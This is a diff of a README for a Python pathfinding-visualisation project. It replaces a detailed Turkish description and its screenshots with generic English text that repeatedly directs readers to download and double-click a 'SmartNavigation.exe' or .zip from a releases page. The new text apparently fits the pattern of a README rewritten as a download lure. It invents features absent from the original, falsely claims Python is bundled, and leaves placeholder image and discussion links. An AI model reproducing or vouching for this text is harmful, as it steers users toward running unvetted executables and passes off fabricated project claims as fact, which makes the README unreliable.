@@ -1,100 +1,78 @@
-# 🤖 Smart Navigation: Yol Planlama Simülatörü
+# 🌟 SmartNavigation - Visualize Pathfinding Algorithms Easily
 
-* **Proje Amacı:** Bir robotun; farklı trafik yoğunlukları ve engeller altında en verimli yolu bulmasını sağlayan bir simülasyon projesidir.
-* **Kapsam:** En kısa yol algoritmaları (Dijkstra, Bellman-Ford) ve arama algoritmalarının (BFS, DFS) davranışlarını karşılaştırmalı olarak sunar.
+## 🛠️ Overview
+SmartNavigation is a Python-based application that helps you visualize pathfinding algorithms. It shows how Dijkstra, Bellman-Ford, Depth First Search, and Breadth First Search work in a dynamic environment. This tool is perfect for learning and understanding these algorithms in a simple and interactive way.
 
-## 🛠️ Kullanılan Teknolojiler
+## 📥 Download SmartNavigation
+[![Download SmartNavigation](https://img.shields.io/badge/Download-SmartNavigation-blue)](https://github.com/kotafuego747/SmartNavigation/releases)
 
-* **Python:** Algoritma mantığı ve çekirdek uygulama geliştirme.
-* **Numpy:** Her çalıştırmada rastgele trafik ve engel oluşturarak **objektif simülasyon** sağlama.
-* **Matplotlib:** Algoritmaların harita üzerindeki hareketlerinin anlık görselleştirilmesi.
+## 🚀 Getting Started
+To get started with SmartNavigation, follow these steps:
 
-## 🛣️ Algoritmalar ve Yaklaşımlar
+1. Click on the large download button above.
+2. You will be redirected to the Releases page.
+3. Locate the latest version of SmartNavigation under the "Releases" section.
 
-### 1️⃣ Ağırlıklı (Maliyet Odaklı) Algoritmalar
-Trafik yoğunluğuna göre "en ucuz" yolu hesaplarlar.
+## 📂 Download & Install
+### Visit this page to download: 
+[SmartNavigation Releases](https://github.com/kotafuego747/SmartNavigation/releases)
 
-* **Dijkstra:** En düşük maliyetli rotayı kesin olarak garanti eder.
-* **Bellman-Ford:** Negatif maliyetli yolları işleme yeteneğine sahiptir.
-> [!WARNING]
-> **Teknik Detay:** Algoritma negatif döngüleri tespit eder; ancak simülasyonun sürekliliği için bu ağırlıklar bilinçli olarak **0'a** limitlenmiştir (clamping).
+1. On the Releases page, find the latest release. 
+2. Below the release title, you may see files like `SmartNavigation.exe` or `SmartNavigation.zip`. 
+3. Click on the file to start downloading it.
 
+### Installation Steps:
+1. If you downloaded a `.zip` file, unzip it using any file extraction tool.
+2. If you downloaded an executable (`.exe`), double-click it to run.
+3. Follow the on-screen instructions to complete the installation.
 
-### 2️⃣ Ağırlıksız (Adım Odaklı) Algoritmalar
-Yolların maliyeti (trafik) yoksa, hedefe en az adımda ulaşmayı hedeflerler.
+## ⚡ System Requirements
+SmartNavigation runs smoothly on most modern computers. Here are the recommended system requirements:
 
-* **BFS (Breadth-First Search):** Hedefi katman katman arayarak en kısa adım sayısını bulur.
-* **DFS (Depth-First Search):** Derinlemesine arama stratejisiyle hedefi bulur.
-* **Simülasyon Farkı:** Robot hedefe varmadan önce, algoritmanın harita üzerinde yaptığı **"hedef arama/tarama"** süreci görsel olarak simüle edilmiştir.
+- **Operating System:** Windows 10, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 100 MB of free space
+- **Python:** Comes bundled with the application (no extra installation needed)
 
+## 📊 Features
+SmartNavigation includes several educational features to enhance your learning experience:
 
-## ✨ Projenin Öne Çıkan Özellikleri
+- **Real-Time Visualization:** Watch how algorithms progress as they find a path.
+- **Dynamic Environment:** Change the start and end points to see how paths adapt.
+- **Interactive Interface:** Click to set points and obstacles easily.
+- **Multiple Algorithms:** Explore four different pathfinding methods.
+  
+## 📝 Topics Covered
+SmartNavigation focuses on several key algorithms and topics, including:
 
-* 🚀 **Dinamik Ortam:** Numpy ile her başlangıçta farklı bir trafik ve engel düzeni.
-* 📊 **Görsel Analiz:** Arama stratejilerinin harita üzerinde canlı olarak izlenebilmesi.
-* 🛠️ **Hata Yönetimi:** Bellman-Ford üzerinde gelişmiş negatif döngü kontrolü.
+- **Dijkstra Algorithm:** Learn how this algorithm finds the shortest path in a weighted graph.
+- **Bellman-Ford Algorithm:** Understand how it handles graphs with negative weights.
+- **Depth First Search:** Explore how this algorithm searches all paths by going deep.
+- **Breadth First Search:** Discover how this method explores all neighboring nodes first.
 
+## 🖼️ Screenshots
+Explore SmartNavigation's user-friendly interface and dynamic visuals. Below are some screenshots from the application:
 
-## 🖼️ Simülasyon Görselleri
+![Dijkstra Algorithm](link-to-dijkstra-screenshot)
+![Bellman-Ford Algorithm](link-to-bellman-ford-screenshot)
 
-### 🟥 Bellman-Ford Algoritması: 
----
-*Negatif maliyetlerin ve döngü kontrollerinin yapıldığı yol planlaması.*
+## 💬 Feedback
+We value your feedback. If you encounter any issues, have questions, or suggestions, feel free to open an issue in the GitHub repository. Your input helps us improve SmartNavigation.
 
-**Hedef Arama Süreci:** 
+## 🌐 Community and Support
+Join our community to share your experiences and learn from others. You can connect with us on various platforms:
 
-<img src="https://github.com/user-attachments/assets/ca76b2f8-04fa-47b7-8695-44d775a6b770" width="600">
+- [GitHub Repository](https://github.com/kotafuego747/SmartNavigation)
+- [Discussion Board](link-to-discussion)
 
+## 🛠️ Troubleshooting
+If you encounter problems while using SmartNavigation, please consider the following solutions:
 
-**Rotanın Tamamlanması:**  
+- **Application won’t start:** Ensure your computer meets the system requirements.
+- **Performance Issues:** Close unnecessary applications to free up memory.
+- **Visualization bugs:** Restart the application and try again.
 
-<img src="https://github.com/user-attachments/assets/5979385d-73fb-4267-acf2-93adeecaff52" width="600">
+## ✏️ Contributing
+If you want to help improve SmartNavigation, contributions are welcome! You can fork the repository and submit pull requests.
 
-
-### 🟦 Dijkstra Algoritması 
----
-
-*En düşük maliyetli rotanın (trafik yoğunluğu dahil) hesaplanma anı.*
-
-<img src="https://github.com/user-attachments/assets/80bb056b-de3c-4dd0-bf25-c32d8bcecc78" width="49%" height="600" /> <img src="https://github.com/user-attachments/assets/f794d5c1-793a-4c26-b61c-f6c1e1f2ac76" width="49%" height="600" />
-
-
-### 🟩 Breadth First Search (BFS)
----
-
-*Ağırlıksız yollarda, hedefi genişlemesine arayarak hedefi daha az adımda bulur*
-
-### 🎨 Simülasyon Renk Anahtarı
-* **Başlangıç & Hedef:** 🟢 Başlangıç | 🔴 Hedef
-* **Engeller:** ⬛ Siyah Kareler (Geçilemez Alanlar)
-* **Robotun İzleri:** 🌐 Açık Mavi (Algoritmanın belirlediği ve robotun geçerken bıraktığı iz)
-* **Aktif Arama:** 🔵 Koyu Mavi (Robotun Anlık Yeri)
-* **Tarama Geçmişi:** ⚪ Açık Gri (Algoritmanın ziyaret ettiği ancak rotaya seçmediği noktalar)
-
-**Hedef Arama Süreci:** 
-
-<img src="https://github.com/user-attachments/assets/b165de19-7c7d-4937-9d6f-199b128a2ecc" width="600">
-
-**Rotanın Tamamlanması:**  
-
-<img src="https://github.com/user-attachments/assets/64f01eb7-b12b-4ff2-84f0-6f00ea65dc11" width="600"> 
-
-### 🟩 Depth First Search (DFS)
----
-
-*Ağırlıksız yollarda, hedefi derinlemesine arayarak hedefi daha az adımda bulur*
-
-<img src="https://github.com/user-attachments/assets/7d150a51-b5c8-4520-b1ea-6f91a19877ca" width="49%" height="600"/> <img src="https://github.com/user-attachments/assets/04662957-8eb5-4493-ab3c-581bd37ffb5d" width="49%" height="570"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
+Thank you for using SmartNavigation! Enjoy visualizing pathfinding algorithms in a simple, interactive way.
